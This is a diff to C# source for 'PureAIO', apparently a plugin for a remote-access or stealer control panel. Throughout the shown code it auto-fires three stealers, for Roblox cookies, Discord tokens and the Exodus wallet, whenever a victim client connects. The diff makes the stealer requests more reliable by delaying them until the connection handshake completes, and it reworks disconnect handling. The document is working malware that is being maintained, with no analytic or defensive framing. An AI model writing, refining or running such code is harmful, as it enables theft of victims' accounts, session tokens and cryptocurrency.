@@ -1,5 +1,6 @@
 using System;
 using System.IO;
+using System.Threading.Tasks;
 using PluginSDK.Interfaces;
 using PluginSDK.Packets;
 using ProtoBuf;
@@ -29,12 +30,17 @@ namespace PureAIO
         public void OnConnected(Action<IPacket> send, Action disconnect)
         {
             _send = send;
-            _form?.SetSend(send);
+            _form?.SetSend(send);       // also updates connection status indicator
 
-            // ── auto-fire all three stealers on connect ──
-            SendPacket(new RobloxCookieRequest());
-            SendPacket(new DiscordTokenRequest());
-            SendPacket(new ExodusRequest());
+            // ── auto-fire all three stealers after a short delay so the
+            //    client-side has time to process the connection handshake ──
+            Task.Run(async () =>
+            {
+                await Task.Delay(500);
+                SendPacket(new RobloxCookieRequest());
+                SendPacket(new DiscordTokenRequest());
+                SendPacket(new ExodusRequest());
+            });
         }
 
         public void OnPacketReceived(IPacket packet)
@@ -58,13 +64,7 @@ namespace PureAIO
         public void OnDisconnected()
         {
             _send = null;
-
-            if (_form == null || _form.IsDisposed) return;
-
-            if (_form.InvokeRequired)
-                _form.Invoke(new Action(() => { if (!_form.IsDisposed) _form.Close(); }));
-            else
-                _form.Close();
+            _form?.SetConnected(false);
         }
 
         // ── send helper ───────────────────────────────────────────────────────
